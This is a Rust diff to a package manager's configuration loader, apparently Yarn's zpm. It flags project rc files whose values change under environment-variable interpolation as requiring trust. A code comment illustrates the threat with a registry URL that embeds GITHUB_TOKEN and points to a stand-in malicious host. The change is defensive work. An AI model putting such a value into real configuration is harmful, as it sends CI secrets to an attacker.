@@ -1,4 +1,4 @@
-use std::{collections::{BTreeMap, BTreeSet}, fmt::Display, ops::Deref, sync::Arc, time::UNIX_EPOCH};
+use std::{cell::Cell, collections::{BTreeMap, BTreeSet}, fmt::Display, ops::Deref, sync::Arc, time::UNIX_EPOCH};
 
 use serde::{Deserialize, Deserializer, Serialize, Serializer, de};
 use zpm_utils::{AbstractValue, Container, Cpu, DataType, FromFileString, IoResultExt, LastModifiedAt, Libc, Os, Path, RawString, Serialized, System, ToFileString, ToHumanString, tree};
@@ -142,6 +142,33 @@ impl<T> Deref for Interpolated<T> {
     }
 }
 
+thread_local! {
+    static REQUIRES_TRUST: Cell<bool> = const { Cell::new(false) };
+}
+
+fn reset_requires_trust() {
+    REQUIRES_TRUST.with(|requires_trust| {
+        requires_trust.set(false);
+    });
+}
+
+fn mark_requires_trust() {
+    REQUIRES_TRUST.with(|requires_trust| {
+        requires_trust.set(true);
+    });
+}
+
+fn take_requires_trust() -> bool {
+    REQUIRES_TRUST.with(|requires_trust| {
+        let value
+            = requires_trust.get();
+
+        requires_trust.set(false);
+
+        value
+    })
+}
+
 impl<'de, T: FromFileString + Deserialize<'de>> Deserialize<'de> for Interpolated<T> where <T as FromFileString>::Error: Display {
     fn deserialize<D: Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
         #[derive(Deserialize)]
@@ -156,6 +183,12 @@ impl<'de, T: FromFileString + Deserialize<'de>> Deserialize<'de> for Interpolate
                 let interpolated
                     = shellexpand::env(&s)
                         .map_err(de::Error::custom)?;
+
+                if interpolated.as_ref() != s {
+                    // If the interpolated value is different from the original, that means it may leak CI secrets,
+                    // for example with `npmRegistryServer: https://malicious.com/${GITHUB_TOKEN}`.
+                    mark_requires_trust();
+                }
 
                 let hydrated
                     = T::from_file_string(&interpolated)
@@ -909,6 +942,7 @@ pub struct Configuration {
     pub settings: Settings,
     pub user_config_path: Option<Path>,
     pub project_config_path: Option<Path>,
+    pub requires_trust: bool,
     pub env_files: BTreeMap<String, String>,
     /// Retained so downstream predicates can re-evaluate without
     /// recomputing the env/cwd snapshot.
@@ -980,6 +1014,11 @@ pub enum HydrateError {
 struct RcFile {
     path: Path,
     text: Option<String>,
+}
+
+fn rc_filename() -> String {
+    std::env::var("YARN_RC_FILENAME")
+        .unwrap_or_else(|_| ".yarnrc.yml".to_string())
 }
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -1080,7 +1119,22 @@ fn retain_user_conflict_fields(value: &mut serde_yaml::Value, root_mode: Option<
     }
 }
 
-fn deserialize_rc_pair(user_rc: Option<&RcFile>, project_rc: Option<&RcFile>) -> Result<(Partial<intermediate::Settings>, Partial<intermediate::Settings>), ConfigurationError> {
+fn deserialize_intermediate_settings(value: Option<serde_yaml::Value>) -> Result<(Partial<intermediate::Settings>, bool), ConfigurationError> {
+    let Some(value) = value else {
+        return Ok((Partial::Missing, false));
+    };
+
+    reset_requires_trust();
+
+    let settings
+        = serde_yaml::from_value(value)?;
+    let requires_trust
+        = take_requires_trust();
+
+    Ok((Partial::Value(settings), requires_trust))
+}
+
+fn deserialize_rc_pair(user_rc: Option<&RcFile>, project_rc: Option<&RcFile>) -> Result<(Partial<intermediate::Settings>, Partial<intermediate::Settings>, bool), ConfigurationError> {
     let mut user_value = user_rc
         .and_then(|rc| rc.text.as_ref())
         .map(|text| serde_yaml::from_str::<serde_yaml::Value>(text))
@@ -1108,17 +1162,12 @@ fn deserialize_rc_pair(user_rc: Option<&RcFile>, project_rc: Option<&RcFile>) ->
         retain_user_conflict_fields(user_value, project_root_mode, &project_field_modes);
     }
 
-    let user = match user_value {
-        Some(value) => Partial::Value(serde_yaml::from_value(value)?),
-        None => Partial::Missing,
-    };
+    let (user, _user_config_requires_trust)
+        = deserialize_intermediate_settings(user_value)?;
+    let (project, requires_trust)
+        = deserialize_intermediate_settings(project_value)?;
 
-    let project = match project_value {
-        Some(value) => Partial::Value(serde_yaml::from_value(value)?),
-        None => Partial::Missing,
-    };
-
-    Ok((user, project))
+    Ok((user, project, requires_trust))
 }
 
 impl RcFile {
@@ -1247,8 +1296,7 @@ impl Configuration {
             = context.project_cwd.as_ref();
 
         let rc_filename
-            = std::env::var("YARN_RC_FILENAME")
-                .unwrap_or_else(|_| ".yarnrc.yml".to_string());
+            = rc_filename();
 
         // Read both rc files upfront (once each)
         let user_rc
@@ -1298,7 +1346,7 @@ impl Configuration {
             = project_rc.as_ref()
                 .map(|rc| rc.path.clone());
 
-        let (intermediate_user_config, intermediate_project_config)
+        let (intermediate_user_config, intermediate_project_config, requires_trust)
             = deserialize_rc_pair(user_rc.as_ref(), project_rc.as_ref())?;
 
         let mut settings = Settings::merge(
@@ -1320,6 +1368,7 @@ impl Configuration {
             settings,
             user_config_path,
             project_config_path,
+            requires_trust,
             env_files,
             context: enriched_context,
         })
